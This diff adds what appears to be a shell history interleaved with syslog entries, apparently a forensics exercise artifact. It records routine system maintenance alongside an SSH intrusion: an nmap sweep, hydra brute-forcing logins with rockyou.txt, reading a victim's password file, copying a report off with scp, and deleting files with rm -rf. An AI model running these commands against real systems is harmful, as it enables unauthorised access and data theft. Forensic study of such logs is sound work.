@@ -1,0 +1,132 @@
+sudo apt-get update
+sudo apt-get dist-upgrade
+sudo reboot now
+sudo apt-get update
+sudo apt-get clean
+sudo apt-get autoclean
+sudo apt-get remove
+sudo apt-get autoremove
+sudo apt-get install vim
+sudo vim /etc/grub.d/40_custom 
+sudo vim /boot/grub/grub.cfg 
+sudo vim /etc/default/grub 
+sudo update-grub
+sudo reboot now
+ip addr
+ifconfig
+ls
+ls -a
+sudo apt-get remove --purge chromium-browser
+nmap
+sudo apt-get install nmap
+sudo apt-get install build-essential 
+sudo apt-get install libssl-dev 
+wget http://download.aircrack-ng.org/aircrack-ng-1.1.tar.gz
+mv aircrack-ng-1.1.tar.gz Desktop/
+cd Desktop/
+tar zxvf aircrack-ng-1.1.tar.gz 
+ls
+cd aircrack-ng-1.1/
+make
+sudo add-apt-repository ppa:pi-rho/security
+sudo apt-get install aircrack-ng
+sudo apt-get update
+sudo apt-get install aircrack-ng
+sudo apt-get install hydra
+sudo apt-get install hydra-gtk
+	Nov  3 18:31:56 wh1t3r0s3-laptop sudo: wh1t3r0s3 : TTY=pts/0 ; PWD=/home/wh1t3r0s3/Desktop/aircrack-ng-1.1 ; USER=root ; COMMAND=/usr/bin/apt-get install hydra-gtk
+	Nov  3 18:31:56 wh1t3r0s3-laptop sudo: pam_unix(sudo:session): session opened for user root by (uid=1000)
+	Nov  3 18:32:01 wh1t3r0s3-laptop sudo: pam_unix(sudo:session): session closed for user root
+ip addr
+	Nov  3 18:44:57 wh1t3r0s3-laptop NetworkManager[766]: <info>   address 10.46.1.106
+	Nov  3 18:44:57 wh1t3r0s3-laptop NetworkManager[766]: <info>   prefix 24 (255.255.255.0)
+	Nov  3 18:44:57 wh1t3r0s3-laptop NetworkManager[766]: <info>   gateway 10.46.1.1
+	Nov  3 18:44:57 wh1t3r0s3-laptop NetworkManager[766]: <info>   hostname 'wh1t3r0s3-laptop'
+nmap -p 22 10.46.1.0/24
+cd Downloads/
+ls
+hydra -f -V -l johnnydoe461 -P rockyou.txt -s 22 10.46.1.103 ssh
+hydra -f -V -s 22 -l johnnydoe461 -P rockyou.txt 10.46.1.103 ssh
+hydra -f -V -s 22 -l johnnydoe461 -P rockyou.txt -t 4 10.46.1.103 ssh
+ip addr
+hydra -f -V -l johnnydoe461 -P rockyou.txt 10.46.1.103 ssh
+hydra -f -V -l johnnydoe461 -P rockyou.txt 10.46.1.103
+hydra -f -V -l johnnydoe461 -P rockyou.txt 10.46.1.103 ssh
+hydra -f -V -l johnnydoe461 -P rockyou.txt -t 4 10.46.1.103 ssh
+hydra -f -V -l root -P rockyou.txt 10.46.1.103 ssh
+cat rockyou.txt 
+q
+hydra -f -V -l root -P rockyou.txt 10.46.1.103 ssh
+ping 10.46.1.103
+cd /etc/grub.d/
+ls
+vim 40_custom 
+cd /boot/grub/
+ls
+sudo vim /etc/default/grub
+vim /boot/grub/grub.cfg 
+sudo reboot now
+sudo update-grub
+sudo reboot now
+sudo apt-get update
+sudo apt-get dist-upgrade
+	Nov  4 00:48:19 wh1t3r0s3-laptop sudo: wh1t3r0s3 : TTY=pts/7 ; PWD=/home/wh1t3r0s3 ; USER=root ; COMMAND=/usr/bin/apt-get dist-upgrade
+cd Downloads/
+hydra -f -V -l johnnydoe461 -P rockyou.txt 10.46.1.103 ssh
+ssh sexyman@10.46.1.103
+ssh johnnydoe461@10.46.1.103
+ssh -X johnnydoe461@10.46.1.103
+	Nov  4 00:48:19 wh1t3r0s3-laptop sudo: pam_unix(sudo:session): session opened for user root by wh1t3r0s3(uid=0)
+	Nov  4 00:48:19 wh1t3r0s3-laptop sudo: pam_unix(sudo:session): session closed for user root
+sudo apt-get install thunderbird
+sudo apt-get remove
+sudo apt-get autoremove
+sudo apt-get clean
+sudo apt-get autoclean
+sudo add-apt-repository ppa:tualatrix/ppa
+sudo apt-get update
+sudo apt-get install ubuntu-tweak 
+uname -r
+dpkg --list | grep linux-image
+sudo apt-get purge linux-image-3.2.0-92-generic 
+uname -r
+dpkg --list | grep linux-image
+sudo update-grub2
+sudo vim /boot/grub/grub.cfg
+sudo vim /etc/default/grub
+cd /
+cd mnt
+sudo mkdir puppy
+sudo mount /dev/sda1 ./puppy/
+cd puppy/
+ls
+rm root/*.sh
+sudo rm root/*.sh
+cd /
+cd /mnt/puppy/
+sudo umount .
+lsof
+cd ..
+sudo umount ./puppy 
+sudo mount /dev/sda1 ./puppy/
+cd puppy/root/
+ls
+cd ../../
+sudo umount ./puppy 
+	Nov  4 10:13:04 wh1t3r0s3-laptop sudo: wh1t3r0s3 : TTY=pts/2 ; PWD=/mnt ; USER=root ; COMMAND=/bin/umount ./puppy
+	Nov  4 10:13:04 wh1t3r0s3-laptop sudo: pam_unix(sudo:session): session opened for user root by wh1t3r0s3(uid=0)
+	Nov  4 10:13:05 wh1t3r0s3-laptop sudo: pam_unix(sudo:session): session closed for user root
+	Nov  4 10:17:01 wh1t3r0s3-laptop CRON[2090]: pam_unix(cron:session): session opened for user root by (uid=0)
+	Nov  4 10:17:01 wh1t3r0s3-laptop CRON[2090]: pam_unix(cron:session): session closed for user root
+ifconfig
+ssh -X johnnydoe461@10.46.1.103
+ls
+cat Desktop/password.txt 
+scp johnnydoe461@10.46.1.103:~/Documents/Project-Report_Final-Draft.doc ~/
+ssh -X johnnydoe461@10.46.1.103
+cd Desktop/
+zip --encypt password.zip password.txt 
+ls
+rm -rf evilplan.doc toxic\ waste\ 1.7\ oz.jpg 
+exit
+ 
